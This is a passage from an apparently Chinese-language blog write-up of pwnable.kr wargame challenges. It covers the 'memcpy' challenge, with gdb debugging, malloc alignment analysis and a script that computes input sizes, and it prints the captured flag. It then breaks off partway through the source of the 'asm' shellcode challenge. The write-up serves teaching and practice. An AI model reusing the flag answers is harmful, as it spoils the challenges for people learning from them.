</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// compiled with : gcc -o memcpy memcpy.c -m32 -lm
</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;math.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">rdtsc</span><span class="p">(){</span>
    <span class="k">asm</span><span class="p">(</span><span class="s">&#34;rdtsc&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">char</span><span class="o">*</span> <span class="nf">slow_memcpy</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dest</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span><span class="o">*</span> <span class="nf">fast_memcpy</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="n">size_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="c1">// 64-byte block fast copy
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">){</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="mi">64</span><span class="p">;</span>
        <span class="n">len</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">64</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
            <span class="n">__asm__</span> <span class="n">__volatile__</span> <span class="p">(</span>
                <span class="s">&#34;movdqa (%0), %%xmm0</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movdqa 16(%0), %%xmm1</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movdqa 32(%0), %%xmm2</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movdqa 48(%0), %%xmm3</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movntps %%xmm0, (%1)</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movntps %%xmm1, 16(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movntps %%xmm2, 32(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="s">&#34;movntps %%xmm3, 48(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
                <span class="o">::</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">src</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">dest</span><span class="p">)</span><span class="o">:</span><span class="s">&#34;memory&#34;</span><span class="p">);</span>
            <span class="n">dest</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
            <span class="n">src</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// byte-to-byte slow copy
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="n">slow_memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>

    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IOLBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Hey, I have a boring assignment for CS class.. :(</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;The assignment is simple.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;-----------------------------------------------------</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- What is the best implementation of memcpy?        -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- 1. implement your own slow/fast version of memcpy -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- 2. compare them with various size of data         -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;- 3. conclude your experiment and submit report     -</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;-----------------------------------------------------</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;This time, just help me out with my experiment and get flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No fancy hacking, I promise :D</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">t1</span><span class="p">,</span> <span class="n">t2</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">e</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">;</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">low</span><span class="p">,</span> <span class="n">high</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="c1">// allocate memory
</span><span class="c1"></span>    <span class="kt">char</span><span class="o">*</span> <span class="n">cache1</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">cache2</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x4000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">src</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">size_t</span> <span class="n">sizes</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>

    <span class="c1">// setup experiment parameters
</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="mi">4</span><span class="p">;</span> <span class="n">e</span><span class="o">&lt;</span><span class="mi">14</span><span class="p">;</span> <span class="n">e</span><span class="o">++</span><span class="p">){</span>    <span class="c1">// 2^13 = 8K
</span><span class="c1"></span>        <span class="n">low</span> <span class="o">=</span> <span class="n">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">e</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">high</span> <span class="o">=</span> <span class="n">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">e</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;specify the memcpy amount between %d ~ %d : &#34;</span><span class="p">,</span> <span class="n">low</span><span class="p">,</span> <span class="n">high</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">low</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="n">high</span> <span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;don&#39;t mess with the experiment.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">sizes</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ok, lets run the experiment with your configuration</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="c1">// run experiment
</span><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">size</span> <span class="o">=</span> <span class="n">sizes</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;experiment %d : memcpy with buffer size %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
        <span class="n">dest</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span> <span class="n">size</span> <span class="p">);</span>

        <span class="n">memcpy</span><span class="p">(</span><span class="n">cache1</span><span class="p">,</span> <span class="n">cache2</span><span class="p">,</span> <span class="mh">0x4000</span><span class="p">);</span>     <span class="c1">// to eliminate cache effect
</span><span class="c1"></span>        <span class="n">t1</span> <span class="o">=</span> <span class="n">rdtsc</span><span class="p">();</span>
        <span class="n">slow_memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>       <span class="c1">// byte-to-byte memcpy
</span><span class="c1"></span>        <span class="n">t2</span> <span class="o">=</span> <span class="n">rdtsc</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ellapsed CPU cycles for slow_memcpy : %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">t2</span><span class="o">-</span><span class="n">t1</span><span class="p">);</span>

        <span class="n">memcpy</span><span class="p">(</span><span class="n">cache1</span><span class="p">,</span> <span class="n">cache2</span><span class="p">,</span> <span class="mh">0x4000</span><span class="p">);</span>     <span class="c1">// to eliminate cache effect
</span><span class="c1"></span>        <span class="n">t1</span> <span class="o">=</span> <span class="n">rdtsc</span><span class="p">();</span>
        <span class="n">fast_memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>       <span class="c1">// block-to-block memcpy
</span><span class="c1"></span>        <span class="n">t2</span> <span class="o">=</span> <span class="n">rdtsc</span><span class="p">();</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;ellapsed CPU cycles for fast_memcpy : %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">t2</span><span class="o">-</span><span class="n">t1</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;thanks for helping my experiment!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;flag : ----- erased in this source code -----</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>读了一遍源码, 好像真的是送分题&hellip;</p>
<p>试了一下, 每次都输入 high-1 , 结果执行了4次以后就没执行了, 大概是挂掉了,
果然没有这么好的事情&hellip;</p>
<p>但是在自己电脑上编译运行了一下, 又能成功, 非常的迷.</p>
<p>折腾半天愣是没弄懂为啥</p>
<p>无奈Google writeup, 发现里面提到在本地编译执行会看到 segmentation fault,
我看了看自己2.26的libc, 仿佛明白了什么&hellip;</p>
<p>果然换成2.23就出现 segmentation fault 了!&hellip;</p>
<p>gdb调试, 定位到段错误的地方</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">►</span> <span class="err">0</span><span class="nf">x5655584c</span> <span class="err">&lt;</span><span class="no">fast_memcpy</span><span class="err">+</span><span class="mi">62</span><span class="err">&gt;</span>    <span class="no">movntps</span> <span class="no">xmmword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">edx</span><span class="p">],</span> <span class="no">xmm0</span>
  <span class="err">0</span><span class="nf">x5655584f</span> <span class="err">&lt;</span><span class="no">fast_memcpy</span><span class="err">+</span><span class="mi">65</span><span class="err">&gt;</span>    <span class="no">movntps</span> <span class="no">xmmword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">edx</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">xmm1</span>
  <span class="err">0</span><span class="nf">x56555853</span> <span class="err">&lt;</span><span class="no">fast_memcpy</span><span class="err">+</span><span class="mi">69</span><span class="err">&gt;</span>    <span class="no">movntps</span> <span class="no">xmmword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">edx</span> <span class="err">+</span> <span class="mi">0x20</span><span class="p">],</span> <span class="no">xmm2</span>
</code></pre></td></tr></table>
</div>
</div><p>Google movntps指令, 发现了在保护模式下可能出现的几种异常</p>
<p><a href="http://www.jaist.ac.jp/iscenter-new/mpc/altix/altixdata/opt/intel/vtune/doc/users_guide/mergedProjects/analyzer_ec/mergedProjects/reference_olh/mergedProjects/instructions/instruct32_hh/vc197.htm">MOVNTPS&ndash;Move Aligned Four Packed Single-FP Non Temporal</a></p>
<table>
<thead>
<tr>
<th>错误码</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td>#GP(0)</td>
<td>For an illegal memory operand effective address in the CS, DS, ES, FS or GS segments. If memory operand is not aligned on a 16-byte boundary, regardless of segment.</td>
</tr>
<tr>
<td>#SS(0)</td>
<td>For an illegal address in the SS segment.</td>
</tr>
<tr>
<td>#PF(fault-code)</td>
<td>For a page fault.</td>
</tr>
<tr>
<td>#NM</td>
<td>If TS in CR0 is set</td>
</tr>
<tr>
<td>#UD</td>
<td>If EM in CR0 is set. If OSFXSR in CR4 is 0. If CPUID feature flag SSE is 0.</td>
</tr>
</tbody>
</table>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">i</span> <span class="no">registers</span> <span class="no">edx</span>
<span class="nf">edx</span>            <span class="mi">0x565594a8</span>    <span class="mi">1448449192</span>
</code></pre></td></tr></table>
</div>
</div><p>查看edx的值, 发现没有对齐, 这大概就是产生段错误的原因了</p>
<p>查看源代码, 知道这个地方是dest的地址(果然还是看不惯AT&amp;T&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">__asm__</span> <span class="nf">__volatile__</span> <span class="p">(</span>
    <span class="s">&#34;movdqa (%0)</span><span class="p">,</span> <span class="o">%%</span><span class="n">xmm0</span><span class="err">\</span><span class="n">n</span><span class="s">&#34;</span>
    <span class="s">&#34;movdqa 16(%0), %%xmm1</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movdqa 32(%0), %%xmm2</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movdqa 48(%0), %%xmm3</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movntps %%xmm0, (%1)</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movntps %%xmm1, 16(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movntps %%xmm2, 32(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;movntps %%xmm3, 48(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="o">::</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">src</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">dest</span><span class="p">)</span><span class="o">:</span><span class="s">&#34;memory&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>查看 malloc 的相关实现(<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_structure/#_3">堆相关数据结构</a>)</p>
<p>可以看到 malloc 每次申请一个 chunk, 由于存在空间复用及对齐,
chunk的大小为
<code>ceil((size + (2 - 1) * SIZE_SZ) / (2 * SIZE_S))) * 2 * SIZE_S</code></p>
<p>32位系统上SIZE_S为4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></td></tr></table>
</div>
</div><p>直接通过以下脚本可以跑出一组数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">can</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8192</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="n">ceil</span><span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span><span class="p">]</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">14</span><span class="p">):</span>
    <span class="n">num</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">can</span> <span class="k">if</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">_</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">_</span><span class="p">)]</span>
    <span class="k">print</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><p>如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">8
21
37
69
133
261
517
1029
2053
4101
</code></pre></td></tr></table>
</div>
</div><p>输入, 得到flag</p>
<p>flag: <code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></p>
<h1 id="asm">asm</h1>
<blockquote>
<p>Mommy! I think I know how to make shellcodes</p>
<p>ssh <a href="mailto:asm@pwnable.kr">asm@pwnable.kr</a> -p2222 (pw: guest)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">asm@ubuntu:~$ ls -l
total 28
-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm
-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c
-rw-r--r-- 1 root root   211 Nov 19  2016 readme
-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
</code></pre></td></tr></table>
</div>
</div><p>readme</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">once you connect to port 9026, the &#34;asm&#34; binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
</code></pre></td></tr></table>
</div>
</div><p>asm.c</p>
<p>编译: gcc asm.c -o asm -lseccomp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;seccomp.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define LENGTH 128
</span><span class="cp"></span>
